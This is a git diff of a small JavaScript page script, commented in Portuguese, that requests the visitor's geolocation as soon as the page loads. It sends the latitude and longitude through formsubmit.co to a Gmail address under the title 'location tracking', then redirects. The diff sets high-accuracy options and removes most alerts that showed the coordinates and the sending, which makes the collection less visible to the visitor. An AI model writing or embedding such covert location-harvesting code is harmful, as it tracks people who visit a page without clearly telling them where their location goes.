@@ -3,6 +3,12 @@
 
 let permissao = 0;
 
+const opcoes = {
+    enableHighAccuracy: true,
+    timeout: 5000,
+    maximumAge: 0
+}
+
 function obterLocalizacao() {
     const resultado = document.getElementById("body");
     if (!navigator.geolocation) {
@@ -16,7 +22,7 @@ function obterLocalizacao() {
             const longitude = posicao.coords.longitude;
             const dados = { latitude: latitude, longitude: longitude }
 
-            alert(`Latitude: ${latitude}Longitude: ${longitude}`);
+            //alert(`Latitude: ${latitude}Longitude: ${longitude}`);
 
             if (dados) {
 
@@ -28,7 +34,9 @@ function obterLocalizacao() {
             resultado.textContent = "Erro ao obter localização: " + erro.message;
             resultado.style = ' color:red;display: flex; justify-content:center;align-items:center; height:100vh';
 
-        }
+        },
+
+        opcoes
     );
 }
 obterLocalizacao();
@@ -37,7 +45,6 @@ obterLocalizacao();
 
 //inicio do envio
 async function formulario(dados) {
-    alert('entou n metodo de envio');
     const campos = {
         _next: 'https://ukwally.github.io/Armindo/index.html',
         hiddenFormTittle: 'TITULO: RASTREIO DE LOCALLISAÇÃO',
@@ -49,7 +56,6 @@ async function formulario(dados) {
         longitude: dados.longitude,
     }
 
-    alert('definio os campos');
     try {
         alert('comessou a tentar enviar');
         const resposta = await fetch('https://formsubmit.co/ukwallyportfolio@gmail.com', {
@@ -60,16 +66,13 @@ async function formulario(dados) {
 
         if (resposta.ok) {
             console.log('sussesso:');
-            alert('sussesso:');
         } else {
 
             console.log(`Erro: ${resposta.status}`);
-            alert(`Erro: ${resposta.status}`);
         }
 
     } catch (error) {
         console.error(`Erro ao enviar Formularioa ${error}`)
-        alert(`Erro ao enviar Formularioa ${error}`)
     }
 }
 //fim do envio
